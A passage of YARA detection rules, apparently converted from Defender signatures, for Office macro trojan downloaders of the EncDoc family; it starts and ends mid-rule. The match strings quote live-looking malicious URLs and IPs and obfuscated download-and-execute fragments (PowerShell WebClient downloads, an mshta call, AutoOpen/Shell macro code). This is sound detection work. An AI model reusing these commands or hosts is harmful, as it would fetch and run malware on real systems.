        $x_1_1 = "appanonline.in/sahxifwomcz/555555555.png" ascii //weight: 1
        $x_1_2 = "C:\\Fetil\\Giola\\oceanDh" ascii //weight: 1
        $x_1_3 = "leyderompientes.cl/ywhbnizyl/555555555.png" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_YAK_2147764368_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.YAK!MTB"
        threat_id = "2147764368"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://185.183.98.14/fontsupdate.php" ascii //weight: 1
        $x_1_2 = "http://padgettconsultants.ca/tau.gif" ascii //weight: 1
        $x_1_3 = "http://www.busnuansa.my.id/pboojfzdzpub/8888888.png" ascii //weight: 1
        $x_1_4 = "http://gidstaxi.nl/mrszheuhe/8888888.png" ascii //weight: 1
        $x_1_5 = "C:\\PerfLogest\\Schrot\\explorers" ascii //weight: 1
        $x_1_6 = "C:\\Programdata\\GolasDh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RSC_2147764483_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RSC!MTB"
        threat_id = "2147764483"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {6a 66 69 2e 63 6f 6d 2e 70 6c 2f 32 31 2e 74 78 74 18 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_2 = {61 62 65 6c 6d 65 2e 63 6f 6d 2e 62 72 2f 32 31 2e 74 78 74 1b 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_3 = {6c 75 70 61 70 6f 6c 69 74 69 63 61 2e 63 6f 6d 2e 62 72 2f 32 31 2e 74 78 74 21 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_2_4 = {61 6c 6b 61 6e 66 61 74 69 68 2e 63 6f 6d 2f 32 31 2e 74 78 74 1c 00 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_1_5 = "C:\\Trast\\Frios\\GolasDh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_PUA_2147764555_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PUA!MTB"
        threat_id = "2147764555"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://graffitiworkshop.se/livmmb/8888888.png" ascii //weight: 1
        $x_1_2 = "C:\\Programdata\\GolasDh" ascii //weight: 1
        $x_1_3 = "dToFileA" ascii //weight: 1
        $x_1_4 = "FileProto" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RE_2147764565_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RE!MTB"
        threat_id = "2147764565"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 74 61 74 69 63 20 53 75 62 20 61 75 74 6f 5f 6f 70 65 6e 28 29 3a 0d 0a 43 61 6c 63 20 3d 20 5f 0d 0a 45 72 72 6f 72 2e 54 65 78 74 42 6f 78 31 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 0d 0a 63 61 6c 63 75 6c 61 74 6f 72 72 72 20 3d 20 53 68 65 6c 6c 28 43 61 6c 63 2c 20 31 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 63 78 63 7a 78 63 22 0d 0a 46 75 6e 63 74 69 6f 6e 20 41 75 74 6f 5f 43 6c 6f 73 65 28 29 20 41 73 20 53 74 72 69 6e 67 0d 0a 53 68 65 6c 6c 20 63 61 6c 63 75 6c 61 74 6f 72 2e [0-31] 2e 54 61 67 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMM_2147764628_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMM!MTB"
        threat_id = "2147764628"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "objFSO.OpenTextFile(strFilename, 2, True)" ascii //weight: 1
        $x_1_3 = "Environ(\"TEMP\") & \"\\\" & realPath" ascii //weight: 1
        $x_1_4 = "ExecuteCmdAsync strCmd" ascii //weight: 1
        $x_1_5 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_6 = "= \"xsqfg.exe\"" ascii //weight: 1
        $x_1_7 = "= objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_8 = "= GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RSD_2147764630_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RSD!MTB"
        threat_id = "2147764630"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/kutiU')" ascii //weight: 1
        $x_1_2 = {77 65 72 73 68 65 6c 6c 20 2d 43 6f 6d 6d 61 6e 64 1a 00 70 6f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVA_2147765878_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVA!MTB"
        threat_id = "2147765878"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FileNlme = \" http://www.j.mp/ajd" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 25 20 5f 0d 0a 20 20 46 69 6c 65 4e 6f 6f 6d 65 20 2b 20 46 69 6c 65 4e 6c 6c 6d 65 2c 20 31}  //weight: 1, accuracy: High
        $x_1_3 = {46 69 6c 65 4e 6f 6f 6d 65 20 3d 20 68 69 6c 6c 2e 46 69 6c 65 4e 78 6d 65 0d 0a 46 69 6c 65 4e 6c 6c 6d 65 20 3d 20 68 69 6c 6c 2e 46 69 6c 65 4e 6c 6d 65}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVB_2147765967_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVB!MTB"
        threat_id = "2147765967"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://beartoothkawasaki.com/QJT19jhtwHt/gg.html" ascii //weight: 1
        $x_1_2 = "\\cexyz2.dll" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_OSTP_2147765972_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.OSTP!MTB"
        threat_id = "2147765972"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://wintertime.website/fe/078270.jse" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "ShellExecuteA" ascii //weight: 1
        $x_1_4 = "C:\\Avast\\Logs\\metasta.me" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_CHS_2147766030_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.CHS!MTB"
        threat_id = "2147766030"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://pickthismotel.xyz/campo/b/b" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\biwa\\wd.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_POI_2147766064_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.POI!MTB"
        threat_id = "2147766064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /k p^ower^shell -w 1 (nEw-oBje`cT Net.WebcL`IENt)" ascii //weight: 1
        $x_1_2 = "('Down'+'loadFile').Invoke(('ht'+'tps://cutt.ly/mggM8iA'),'vj.exe')" ascii //weight: 1
        $x_1_3 = "$env:appdata;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QBT_2147766255_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QBT!MTB"
        threat_id = "2147766255"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://dharmasasthatrust.com/cEJYcStqlAf/hr.h\"&\"tml" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"ps://shalsa3d.com/UGqWNCLT/hr.h\"&\"t\"&\"ml" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"ps://haroldhallroofing.net/pAz8O63Gn/hr.h\"&\"tml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVE_2147766306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVE!MTB"
        threat_id = "2147766306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "\"http://gaidov.bg/wp-includes/Ug/\",\"" ascii //weight: 10
        $x_10_2 = "\"http://studiokrishnaproduction.com/wp-includes/3mJ/\",\"" ascii //weight: 10
        $x_10_3 = "\"http://goodmarketinggroup.com/live_site/Y9cEk9QNlDUeg/\",\"" ascii //weight: 10
        $x_10_4 = "\"https://wordpressdes.vanzolini-gte.org.br/fundacaotelefonica.org.br/gAbC4QpJYI/\",\"" ascii //weight: 10
        $x_10_5 = "\"http://shopnhap.com/highbinder/nnYko9FDNJ/\",\"" ascii //weight: 10
        $x_10_6 = "\"http://txingame.com/wp-content/PwKfVQfdhHbAv2j/\",\"" ascii //weight: 10
        $x_1_7 = "D\"&\"l\"&\"lR\"&\"egister\"&\"Serve\"&\"r" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_RVE_2147766306_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVE!MTB"
        threat_id = "2147766306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"p\"&\"s://o\"&\"st.n\"&\"e\"&\"t.br/t\"&\"oX\"&\"uN\"&\"S0\"&\"0/l.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"p\"&\"s://a\"&\"to\"&\"ch\"&\"ag\"&\"ale\"&\"ria.c\"&\"o\"&\"m.ar/CnijALAyxR/l.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"t\"&\"t\"&\"ps://maberic.com/3XRJdBEjFc/l.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_4 = "\"h\"&\"tt\"&\"ps://t\"&\"h\"&\"eor\"&\"esta\"&\"ura\"&\"nt\"&\"e.com.mx/mQ\"&\"JQN\"&\"de\"&\"wR3q/v.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p\"&\"s://hib\"&\"is\"&\"cu\"&\"s\"&\"m\"&\"ark\"&\"eti\"&\"n\"&\"g.co.in/k\"&\"5f4\"&\"p\"&\"L\"&\"Lb\"&\"J/v.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_6 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://a\"&\"u\"&\"t\"&\"o\"&\"p\"&\"ar\"&\"tes\"&\"e\"&\"n\"&\"g\"&\"ua\"&\"da\"&\"la\"&\"jar\"&\"a.c\"&\"o\"&\"m/C\"&\"3\"&\"B5\"&\"6\"&\"5\"&\"n\"&\"F\"&\"P/v.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_7 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://touragencybhutan.com/pISdnpsfb/y.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_8 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://realcotacoes.com.br/D7fBoHtyd/y.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_9 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://campoinvest.com.br/cPv4PgoU/y.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVF_2147766628_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVF!MTB"
        threat_id = "2147766628"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.85.101/balzak/balzak.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TST_2147767370_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TST!MTB"
        threat_id = "2147767370"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://nics.co.id/yftxdru/" ascii //weight: 1
        $x_1_2 = "1254750.png" ascii //weight: 1
        $x_1_3 = "C:\\Test\\test2\\Fiksat.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TSL_2147767477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TSL!MTB"
        threat_id = "2147767477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://ummulqurany.org/bvalldhzn/" ascii //weight: 1
        $x_1_2 = "C:\\Test\\test2\\Fiksat.exe" ascii //weight: 1
        $x_1_3 = "OpenURL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STD_2147767482_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STD"
        threat_id = "2147767482"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 28 22 68 74 74 70 3a 2f 2f [0-32] 22 29 2c 20 22 [0-10] 22 2c 20 22 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 76 69 72 6f 6e 24 [0-16] 31 31 36 [0-16] 31 30 39 [0-16] 31 31 32 [0-32] 52 65 70 6c 61 63 65 28 22 76 62 63 2e [0-10] 22 2c 20 22 [0-10] 22 2c 20 22 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c [0-64] 48 69 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VAT_2147767530_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VAT!MTB"
        threat_id = "2147767530"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://seemehere.ga/1.exe" ascii //weight: 1
        $x_1_2 = "C:\\JrreRsP\\bpXoaeE\\yujEtky.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAY_2147767533_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAY!MTB"
        threat_id = "2147767533"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb_name=\"vnbiubni7ghb7n6d786dhf8u\"" ascii //weight: 1
        $x_1_2 = ".textbox4.text=\"wgjab\"" ascii //weight: 1
        $x_1_3 = {2e 74 65 78 74 3d 6c 65 66 74 28 [0-127] 2e 63 65 6c 6c 28 32 2c 31 29 2c 6c 65 6e 28 00 2e 63 65 6c 6c 28 32 2c 31 29 29 2d 32 29 2b 76 62 63 72 6c 66 2b 6c 65 66 74 28 00 2e 63 65 6c 6c 28 34 2c 31 29 2c 6c 65 6e 28 00 2e 63 65 6c 6c 28 34 2c 31 29 29 2d 32 29 6f 70 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAY_2147767533_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAY!MTB"
        threat_id = "2147767533"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"p://t\"&\"han\"&\"han\"&\"hotel.com/M7NvbognImhW/hnhkji.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"ps://guar\"&\"ds\"&\"oc\"&\"iety.org/4TMUUI9u/hnhkji.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p://bro.jera\"&\"shf\"&\"estival.jo/2kAlAJGc/hnhkji.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_4 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\"://ar\"&\"anc\"&\"al.c\"&\"o\"&\"m\"&\"/HgLCgCS3m/be.h\"&\"t\"&\"m\"&\"l\"," ascii //weight: 1
        $x_1_5 = "h\"&\"t\"&\"t\"&\"ps\"&\"://i\"&\"per\"&\"de\"&\"sk.c\"&\"o\"&\"m\"&\"/JWqj8R2nt/be.h\"&\"t\"&\"m\"&\"l\"," ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\"://gran\"&\"dthu\"&\"m.c\"&\"o.i\"&\"n/9Z\"&\"6D\"&\"H5\"&\"h5g/b\"&\"e.h\"&\"t\"&\"m\"&\"l\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_HLO_2147768672_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.HLO!MTB"
        threat_id = "2147768672"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://u4p9wo4kgybo.top/4z4vPKNEhH/JZHjGG.triumphloader" ascii //weight: 1
        $x_1_2 = "zipfldr" ascii //weight: 1
        $x_1_3 = "CreateDirectoryA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_NJR_2147768798_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.NJR!MTB"
        threat_id = "2147768798"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://tinyurl.com/yxjcquxy" ascii //weight: 1
        $x_1_2 = "C:\\PROGRAMDATA\\a.vbs" ascii //weight: 1
        $x_1_3 = "JJCCJJ" ascii //weight: 1
        $x_1_4 = "ExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVH_2147769161_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVH!MTB"
        threat_id = "2147769161"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= (\"ping google.com;\" + EDfP5)" ascii //weight: 1
        $x_1_2 = ".Shapes(1).TextFrame.Characters.Text" ascii //weight: 1
        $x_1_3 = "CallByName(NAMEME.HAfwG(), TeCBE(), VbMethod, JGFM(), jibNY(), Null, Null, 0)" ascii //weight: 1
        $x_1_4 = "\"p\" + EDfP6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVH_2147769161_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVH!MTB"
        threat_id = "2147769161"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ping google.com;\" + eeeew" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 42 79 4e 61 6d 65 28 6b 6c 73 61 64 28 29 2c 20 52 61 6e 67 65 28 22 43 38 22 29 2e 4e 6f 74 65 54 65 78 74 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-6] 28 30 29 2c 20 00 28 31 29 2c 20 00 28 32 29 2c 20 00 28 33 29 2c 20 00 28 34 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "GetObject(Range(\"C7\").NoteText)" ascii //weight: 1
        $x_1_4 = "newStr & Mid(str, strLen - (i - 1), 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_CLC_2147769203_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.CLC!MTB"
        threat_id = "2147769203"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
